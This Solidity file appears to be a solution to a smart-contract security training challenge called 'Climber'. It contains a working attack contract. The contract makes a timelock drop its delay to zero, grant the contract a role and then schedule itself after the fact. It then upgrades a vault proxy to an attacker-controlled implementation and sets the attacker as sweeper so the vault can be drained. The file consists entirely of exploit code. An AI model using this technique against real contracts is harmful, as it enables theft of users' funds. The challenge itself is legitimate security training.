// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";

interface ITimeLock {
  function schedule(
    address[] calldata,
    uint256[] calldata,
    bytes[] calldata dataElements,
    bytes32 salt
  ) external;

  function execute(
    address[] calldata,
    uint256[] calldata,
    bytes[] calldata dataElements,
    bytes32 salt
  ) external;
}

contract AttackClimberVault is ClimberVault {
  bytes32 role;
  address timelock;
  address attacker;

  constructor(bytes32 _role, address _timelock) {
    role = _role;
    timelock = _timelock;
    attacker = msg.sender;
  }

  function setSweeper(address sweeper) external {
    _setSweeper(sweeper);
  }

  function schedule() external {
    address[] memory targets = new address[](3);
    uint256[] memory values = new uint256[](3);
    bytes[] memory dataElements = new bytes[](3);

    targets[0] = timelock;
    targets[1] = timelock;
    targets[2] = address(this);

    values[0] = 0;
    values[1] = 0;
    values[1] = 0;

    dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
    dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", role, address(this));
    dataElements[2] = abi.encodeWithSignature("schedule()");

    ITimeLock(timelock).schedule(targets, values, dataElements, "");
  }

  function attack(address vault) external{
    address[] memory targets = new address[](2);
    uint256[] memory values = new uint256[](2);
    bytes[] memory dataElements = new bytes[](2);

    targets[0] = vault;
    targets[1] = vault;

    values[0] = 0;
    values[1] = 0;

    dataElements[0] = abi.encodeWithSignature("upgradeTo(address)", address(this));
    dataElements[1] = abi.encodeWithSignature("setSweeper(address)", attacker);

    ITimeLock(timelock).schedule(targets, values, dataElements, "");
    ITimeLock(timelock).execute(targets, values, dataElements, "");
  }
}
